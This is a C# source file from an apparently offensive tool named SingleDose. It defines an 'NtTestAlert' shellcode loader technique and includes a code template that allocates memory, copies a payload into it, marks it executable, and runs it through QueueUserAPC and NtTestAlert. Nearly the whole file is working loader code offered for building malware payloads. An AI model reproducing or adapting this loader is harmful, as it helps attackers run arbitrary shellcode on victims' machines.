using System.Collections.Generic;

namespace SingleDose.Techniques.Loaders
{
    internal class NtTestAlert : ITechnique
    {
        string ITechnique.TechniqueName => "NtTestAlert";

        string ITechnique.TechniqueDescription => "With a call to QueueUserAPC pointing to your shellcode, NtTestAlert will clear the APC queue for the current thread leading to shellcode execution.";

        List<string> ITechnique.TechniqueReferences => new List<string>() 
        {
            @"https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert",
            @"http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FAPC%2FNtTestAlert.html"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => true;
        
        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "QueueUserAPC", "GetCurrentThread", "NtTestAlert" };
        
        List<string> ITechnique.Prerequisites => null;
        
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}

            QueueUserAPC(hAlloc, GetCurrentThread(), IntPtr.Zero);
            NtTestAlert();
        }

        {{ARGS}}
        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
